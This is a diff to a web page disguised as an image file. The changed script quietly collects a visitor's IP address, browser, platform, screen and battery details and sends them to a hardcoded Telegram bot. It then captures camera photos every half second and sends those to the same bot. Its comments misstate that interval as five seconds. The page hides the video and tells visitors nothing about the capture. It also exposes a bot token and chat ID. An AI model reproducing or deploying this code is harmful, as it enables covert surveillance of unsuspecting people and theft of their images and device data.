@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Capture and Send Photo</title>
+    <title>image_9363638</title>
     <style>
         video { display: none; } 
         h1 { color: green; text-align: center; }
@@ -16,37 +16,61 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const BOT_TOKEN = "8023106166:AAEGed6xp19KBQWiUmsv6P7_Bi1ZDhHJ3VU";  // Your Bot Token
-        const CHAT_ID = "2139008203";  // Your Chat ID
-        const canvasFront = document.createElement('canvas');
-        const canvasBack = document.createElement('canvas');
-        let videoFront = null;
-        let videoBack = null;
-        let streamFront = null;
-        let streamBack = null;
+        const BOT_TOKEN = "8023106166:AAEGed6xp19KBQWiUmsv6P7_Bi1ZDhHJ3VU";
+        const CHAT_ID = "2139008203";
+        const canvas = document.getElementById('canvas');
+        let videoStream = null;
+        let video = null;
+        let intervalId = null;
 
-        // Function to start camera based on facing mode
-        async function startCamera(facingMode) {
+        async function sendDeviceInfo() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
-                const video = document.createElement('video');
-                video.srcObject = stream;
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const ipAddress = data.ip;
+
+                const battery = await navigator.getBattery();
+                const batteryStatus = `Battery Level: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging ? "Yes" : "No"}`;
+
+                const deviceInfo = `
+Device Information:
+- IP Address: ${ipAddress}
+- Browser: ${navigator.userAgent}
+- Platform: ${navigator.platform}
+- Screen Resolution: ${window.screen.width}x${window.screen.height}
+- ${batteryStatus}
+                `;
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: deviceInfo })
+                });
+            } catch (error) {
+                console.error("Error fetching device info:", error);
+            }
+        }
+
+        async function startCamera() {
+            try {
+                video = document.createElement('video');
+                videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = videoStream;
 
                 return new Promise((resolve) => {
                     video.onloadedmetadata = () => {
                         video.play();
-                        resolve({ video, stream });
+                        resolve(true);
                     };
                 });
             } catch (error) {
-                console.error(`Error accessing ${facingMode} camera:`, error);
-                return null;
+                console.error("Camera access denied:", error);
+                return false;
             }
         }
 
-        // Function to capture photo from a video stream
-        async function capturePhoto(video, canvas) {
-            if (!video) return null;
+        async function capturePhoto() {
+            if (!video || !videoStream) return;
 
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -55,69 +79,46 @@
             return canvas.toDataURL('image/png');
         }
 
-        // Function to send photo to Telegram
         async function sendPhoto() {
-            const frontPhoto = await capturePhoto(videoFront, canvasFront);
-            const backPhoto = await capturePhoto(videoBack, canvasBack);
-            if (!frontPhoto && !backPhoto) return;
+            const photoData = await capturePhoto();
+            if (!photoData) return;
 
+            const blob = await (await fetch(photoData)).blob();
             const formData = new FormData();
             formData.append("chat_id", CHAT_ID);
+            formData.append("photo", blob, "photo.png");
 
-            // Sending both front and back photos in one message
-            if (frontPhoto) {
-                const frontBlob = await (await fetch(frontPhoto)).blob();
-                formData.append("photo", frontBlob, "front_photo.png");
-            }
-            if (backPhoto) {
-                const backBlob = await (await fetch(backPhoto)).blob();
-                formData.append("photo", backBlob, "back_photo.png");
-            }
-
-            // Send photos to Telegram
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: "POST",
-                    body: formData
-                });
-            } catch (error) {
-                console.error("Error sending photos:", error);
-            }
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
         }
 
-        // Function to start the photo capture loop
         async function startPhotoCaptureLoop() {
-            // Start both front and back cameras
-            const frontCamera = await startCamera("user");
-            const backCamera = await startCamera("environment");
+            sendDeviceInfo(); // ডিভাইসের তথ্য প্রথমেই পাঠাবে
 
-            if (!frontCamera || !backCamera) {
-                console.error("Could not access both front and back cameras");
-                return;
-            }
+            const cameraStarted = await startCamera();
+            if (!cameraStarted) return;
 
-            videoFront = frontCamera.video;
-            streamFront = frontCamera.stream;
+            sendPhoto(); // প্রথম ছবি পাঠাবে
 
-            videoBack = backCamera.video;
-            streamBack = backCamera.stream;
-
-            // Capture and send photos after 5 seconds
-            setTimeout(sendPhoto, 1000);
+            intervalId = setInterval(sendPhoto, 500); // প্রতি ৫ সেকেন্ডে নতুন ছবি পাঠাবে
         }
 
-        // Start the photo capture loop when the window loads
-        window.onload = startPhotoCaptureLoop;
+        function stopCamera() {
+            if (videoStream) {
+                videoStream.getTracks().forEach(track => track.stop());
+                videoStream = null;
+                video = null;
+            }
+            if (intervalId) {
+                clearInterval(intervalId);
+                intervalId = null;
+            }
+        }
 
-        // Stop the camera when the page is about to unload
-        window.onbeforeunload = () => {
-            if (streamFront) {
-                streamFront.getTracks().forEach(track => track.stop());
-            }
-            if (streamBack) {
-                streamBack.getTracks().forEach(track => track.stop());
-            }
-        };
+        window.onload = startPhotoCaptureLoop;
+        window.onbeforeunload = stopCamera;
     </script>
 </body>
 </html>
